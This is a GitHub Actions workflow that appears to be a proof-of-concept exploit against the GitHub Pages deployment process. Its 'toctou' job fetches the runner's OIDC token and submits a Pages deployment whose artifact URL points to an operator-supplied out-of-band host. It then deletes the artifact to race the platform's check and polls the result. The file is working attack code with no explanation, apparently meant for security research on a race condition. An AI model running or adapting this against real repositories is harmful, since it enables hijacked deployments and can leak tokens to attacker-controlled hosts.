name: pgdep2
on:
  workflow_dispatch:
    inputs:
      oob:
        description: oob host
        required: true
permissions:
  contents: read
  pages: write
  id-token: write
  actions: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: mkdir -p _site && echo "<h1>pgdep2</h1>" > _site/index.html
      - uses: actions/upload-pages-artifact@v3
  deploy:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: github-pages
    steps:
      - name: toctou
        env:
          OOB: ${{ github.event.inputs.oob }}
          GH_TOKEN: ${{ github.token }}
        run: |
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
          echo "::add-mask::$TOKEN"
          ART=$(curl -s -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/artifacts" | jq -r '.artifacts[] | select(.name=="github-pages") | .id')
          echo "artifact_id = $ART"
          URL="https://$OOB/_apis/pipelines/1/runs/1/artifacts?artifactName=github-pages&%24expand=SignedContent&arm=toctou"
          echo "===== POST both fields, then IMMEDIATELY delete the artifact ====="
          curl -s -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments" \
            -d "{\"artifact_id\":$ART,\"artifact_url\":\"$URL\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
          curl -s -w 'DELETE artifact HTTP %{http_code}\n' -X DELETE -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/artifacts/$ART"
          echo "===== deleted at $(date -u +%H:%M:%S) ====="
          sleep 45
          curl -s "https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployment/status/$GITHUB_SHA" -H "Authorization: token $GH_TOKEN"
